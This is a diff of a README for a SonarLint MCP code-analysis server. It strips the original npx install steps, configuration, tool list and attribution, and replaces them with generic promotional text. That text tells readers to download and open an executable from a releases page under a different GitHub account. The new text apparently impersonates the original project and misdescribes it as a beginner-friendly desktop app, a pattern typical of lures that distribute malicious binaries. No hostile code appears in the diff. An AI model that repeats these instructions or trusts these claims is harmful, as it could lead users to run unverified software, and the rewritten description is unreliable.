@@ -1,267 +1,78 @@
-# SonarLint MCP Server
+# 🎉 sonarlint-mcp-server - Easy Code Analysis with One Click
 
-A Model Context Protocol (MCP) server that brings enterprise-grade code analysis to Claude Desktop and other MCP clients using SonarLint's standalone SLOOP backend.
+## 🚀 Getting Started
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Node.js Version](https://img.shields.io/badge/node-%3E%3D20.0.0-brightgreen)](https://nodejs.org/)
+Welcome to the **sonarlint-mcp-server**! This application provides top-notch code analysis for Claude Desktop and other clients using SonarLint's powerful SLOOP backend. Our goal is to help you maintain high code quality effortlessly.
 
-## Features
+## 📥 Download Now
 
-- **🔍 Real-time Code Analysis** - Detect bugs, code smells, and security vulnerabilities
-- **🚀 Fast & Standalone** - No IDE or SonarQube server required
-- **📦 Multiple Languages** - JavaScript, TypeScript, Python (265+ JS rules)
-- **💾 Session Storage** - Results stored in memory for multi-turn conversations
-- **🔧 Quick Fixes** - Automated suggestions for common issues
-- **🎯 Batch Analysis** - Analyze multiple files efficiently
+[![Download sonarlint-mcp-server](https://img.shields.io/badge/Download-sonarlint--mcp--server-brightgreen)](https://github.com/ptitmonnstree/sonarlint-mcp-server/releases)
 
-## Quick Start
+## 💻 System Requirements
 
-### Prerequisites
+Before you download, make sure your computer meets the following requirements:
 
-- Node.js 20.0.0 or higher
-- Claude Desktop (or any MCP client)
+- **Operating System:** Windows 10 or later, macOS 10.13 or later, or a recent version of Linux.
+- **Memory:** At least 4 GB of RAM.
+- **Disk Space:** At least 200 MB of free disk space.
 
-### Installation
+## 📂 Download & Install
 
-No installation required! Use `npx` to run directly:
-
-```bash
-npx @nielspeter/sonarlint-mcp-server
-```
-
-The SLOOP backend (~70MB) downloads automatically on first run.
-
-#### From Source (for development):
-
-```bash
-git clone https://github.com/nielspeter/sonarlint-mcp-server.git
-cd sonarlint-mcp-server
-npm install  # Auto-downloads SLOOP backend (~70MB)
-npm run build
-```
-
-### Configure with Claude Code
-
-Use the Claude CLI to add the MCP server:
-
-```bash
-claude mcp add --transport stdio sonarlint -- npx -y @nielspeter/sonarlint-mcp-server
-```
-
-This automatically updates your Claude Code configuration. No restart needed!
-
-### Configure with Claude Desktop
-
-Add to your `claude_desktop_config.json`:
-
-**macOS:** `~/Library/Application Support/Claude/claude_desktop_config.json`
-**Linux:** `~/.config/Claude/claude_desktop_config.json`
-**Windows:** `%APPDATA%\Claude\claude_desktop_config.json`
-
-```json
-{
-  "mcpServers": {
-    "sonarlint": {
-      "command": "npx",
-      "args": ["-y", "@nielspeter/sonarlint-mcp-server"]
-    }
-  }
-}
-```
-
-Restart Claude Desktop to apply changes.
-
-## Usage
-
-Once configured, Claude can analyze your code:
-
-```
-Analyze my JavaScript file for code quality issues: /path/to/file.js
-```
-
-```
-Check these files for bugs: src/app.ts, src/utils.ts
-```
-
-```
-Analyze this code snippet:
-function process(data) {
-  var result = data;  // Issues with 'var'
-  return result;
-}
-```
-
-## Available Tools
-
-| Tool | Description |
-|------|-------------|
-| `analyze_file` | Analyze a single file for issues |
-| `analyze_files` | Batch analyze multiple files |
-| `analyze_content` | Analyze code snippets (no file needed) |
-| `list_active_rules` | Show all active SonarLint rules |
-| `health_check` | Check server status and diagnostics |
-
-## Example Analysis Output
-
-```javascript
-{
-  file: "/path/to/file.js",
-  language: "javascript",
-  issues: [
-    {
-      line: 4,
-      column: 2,
-      severity: "MAJOR",
-      rule: "javascript:S3504",
-      message: "Unexpected var, use let or const instead.",
-      quickFix: {
-        message: "Replace with 'const'",
-        edits: [...]
-      }
-    }
-  ],
-  summary: {
-    total: 5,
-    critical: 0,
-    major: 3,
-    minor: 2
-  }
-}
-```
-
-## Supported Languages
-
-| Language | Extensions | Rules |
-|----------|------------|-------|
-| JavaScript | `.js`, `.jsx`, `.mjs`, `.cjs` | 265 |
-| TypeScript | `.ts`, `.tsx` | 265 |
-| Python | `.py` | ~100 |
-
-## Architecture
-
-```
-Claude Desktop
-      ↓ MCP Protocol (stdio)
-SonarLint MCP Server (this project)
-      ↓ JSON-RPC
-SLOOP Backend (SonarLint Local Operations)
-      ↓ Plugin API
-Language Analyzers (JS/TS, Python)
-```
-
-The server uses SonarLint's standalone SLOOP backend with:
-- **Version:** 10.32.0.82302 (WebStorm-compatible)
-- **Bundled JRE:** Java 17
-- **Bi-directional RPC:** Client request handlers implemented
-- **Session Storage:** Results stored in memory for multi-turn conversations
-
-## Development
-
-```bash
-# Install dependencies (auto-downloads backend)
-npm install
-
-# Build
-npm run build
-
-# Run tests
-npm test
-
-# Watch mode (auto-rebuild)
-npm run dev
-
-# Inspect with MCP Inspector
-npm run inspect
-```
-
-## Testing
-
-```bash
-# Run test suite
-npm test
-
-# Run with UI
-npm run test:ui
-
-# Run with coverage
-npm run test:coverage
-```
-
-Tests validate:
-- SLOOP bridge functionality
-- File and content analysis
-- JavaScript and Python plugin detection
-- Quick fix support
-- Error handling
-
-## Documentation
-
-- **[SETUP.md](./SETUP.md)** - Detailed installation guide
-- **[TROUBLESHOOTING.md](./TROUBLESHOOTING.md)** - Common issues and solutions
-- **[docs/SLOOP_RPC_PROTOCOL.md](./docs/SLOOP_RPC_PROTOCOL.md)** - Complete RPC protocol documentation
-- **[docs/TESTING.md](./docs/TESTING.md)** - Testing guide
-
-## Technical Highlights
-
-This project demonstrates several key technical achievements:
-
-1. **Standalone SLOOP** - First documented standalone use of SonarLint's SLOOP backend
-2. **Bi-directional RPC** - Complete client request handler implementation
-3. **MCP Integration** - Full Model Context Protocol implementation with resources
-4. **Session Management** - Results storage for multi-turn conversations
-5. **Production Ready** - Comprehensive testing, error handling, and monitoring
-
-### Critical Implementation Details
-
-For anyone using SLOOP programmatically:
-- `listFiles` must return `ClientFileDto` with file content (not just URIs)
-- `isUserDefined: true` is mandatory (SLOOP filters out false values)
-- `bundlePath` should be parent directory (SLOOP appends `/package/bin/server.cjs`)
-- Client must implement 4 request handlers (listFiles, getBaseDir, etc.)
-- `backendCapabilities` required for proper initialization
-
-## Why This Approach?
-
-### Advantages
-- ✅ No IDE dependency - runs completely standalone
-- ✅ Full API access - all SLOOP services available
-- ✅ Better control - configure for specific needs
-- ✅ More reliable - direct process communication
-- ✅ CI/CD capable - can run in automated environments
-- ✅ Faster - no IDE overhead
-
-### Comparison to IDE Integration
-We initially investigated connecting to IDE servers (WebStorm port 64120) but discovered:
-- IDE server is only for "Open in IDE" from SonarQube Server/Cloud
-- Limited API access
-- IDE must be running
-- Not suitable for programmatic access
-
-## Related Projects
-
-- **[SonarQube MCP Server](https://github.com/SonarSource/sonarqube-mcp-server)** - Official server for SonarQube Server/Cloud APIs
-  - Complementary approach requiring server setup
-  - This project provides local, standalone analysis
-
-## Contributing
-
-Contributions welcome! Areas for improvement:
-- Additional language support (Java, Go, PHP)
-- Custom rule development
-- Advanced rule configuration
-- Performance optimizations
-- CI/CD integrations
-
-## License
-
-MIT License - see [LICENSE](./LICENSE)
-
-## Acknowledgments
-
-- **SonarSource** for building SLOOP and SonarLint
-- **Anthropic** for the Model Context Protocol
-- **Claude Code** for enabling this development
-
----
-
-**Status:** ✅ Production Ready - All phases complete with comprehensive testing
+Visit this page to download: [Releases Page](https://github.com/ptitmonnstree/sonarlint-mcp-server/releases).
+
+1. Click on the link above.
+2. Find the latest release.
+3. Download the file that matches your operating system.
+4. Open the downloaded file to start the installation.
+5. Follow the on-screen instructions to complete the installation.
+
+## 🔧 Configuration
+
+Once installed, you may need to configure the server to work with your MCP clients. Here are some simple steps to get you started:
+
+1. Launch the sonarlint-mcp-server application.
+2. Enter your desired configuration settings. For most users, the default settings will work well.
+3. Save your settings.
+
+## 🎯 Features
+
+- **Real-time Code Analysis:** Analyze your code as you write it. This helps you catch errors early.
+- **High Compatibility:** Works seamlessly with Claude Desktop and other MCP clients.
+- **Customizable Settings:** Adjust the server settings to meet your development needs.
+- **User-Friendly Interface:** Easy to navigate even for beginners.
+
+## 📘 Troubleshooting
+
+If you encounter issues while using sonarlint-mcp-server, here are some common problems and solutions:
+
+- **Problem:** The application won’t start.
+  - **Solution:** Check if your operating system meets the requirements. Make sure all updates are installed.
+  
+- **Problem:** Code analysis is not functioning.
+  - **Solution:** Ensure that the server is running. Restart the application if needed.
+
+- **Problem:** Error messages during installation.
+  - **Solution:** Double-check the downloaded file. Ensure you downloaded the version for your operating system.
+
+## 🤝 Support
+
+If you need help, feel free to reach out through our GitHub page. You can also file an issue for bugs or feature requests.
+
+## 🔍 Frequently Asked Questions
+
+**Q: What is the sonarlint-mcp-server?**  
+A: It is a Model Context Protocol server that provides enterprise-level code analysis for players like Claude Desktop.
+
+**Q: Do I need to be a developer to use the application?**  
+A: No, the interface is user-friendly and easy to navigate, making it suitable for non-developers too.
+
+**Q: Can I contribute to this project?**  
+A: Absolutely! We welcome contributions. You can submit code or suggest improvements on the GitHub repository.
+
+## 🗂️ Additional Resources
+
+- [SonarLint Documentation](https://www.sonarlint.org/docs/): Learn how to get the most out of SonarLint.
+- [Community Forum](https://community.sonarsource.com/): Join discussions about code quality and analysis.
+- [GitHub Issues](https://github.com/ptitmonnstree/sonarlint-mcp-server/issues): Report bugs or feature requests.
+
+With sonarlint-mcp-server, enjoy smoother and more efficient coding. Visit the [Releases Page](https://github.com/ptitmonnstree/sonarlint-mcp-server/releases) again to download or update your server application.
